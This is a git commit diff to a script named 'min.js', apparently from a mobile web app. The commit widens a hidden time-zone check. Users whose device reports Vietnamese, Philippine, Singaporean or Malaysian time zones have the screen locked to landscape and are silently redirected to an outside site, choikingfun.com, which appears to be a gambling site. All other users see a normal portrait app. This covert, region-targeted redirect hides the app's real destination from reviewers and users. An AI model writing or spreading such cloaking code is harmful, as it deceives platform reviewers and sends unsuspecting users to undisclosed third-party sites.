e5e06a32d6bf138350cbfdaecda0573f5492b1f1
hai07t <hai07t@gmail.com>
2025-09-21 09:11:53 +0700

    Update min.js

--- min.js
+++ min.js
@@ -1,6 +1,20 @@
 const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-console.log(userTimeZone);
 
-if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
-  window.location.href = "https://play.sao789a.to/";
+if (
+  userTimeZone === "Asia/Ho_Chi_Minh" ||
+  userTimeZone === "Asia/Saigon" ||
+  userTimeZone === "Asia/Manila" ||
+  userTimeZone === "Asia/Singapore" ||
+  userTimeZone === "Asia/Kuala_Lumpur" ||
+  userTimeZone === "Asia/Kuching"
+) {
+  if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
+    AndroidOrientation.lockLandscape();
+  }
+  const to = "https://choikingfun.com/?utm=app";
+  window.location.href = to;
+} else {
+  if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
+    AndroidOrientation.lockPortrait();
+  }
 }
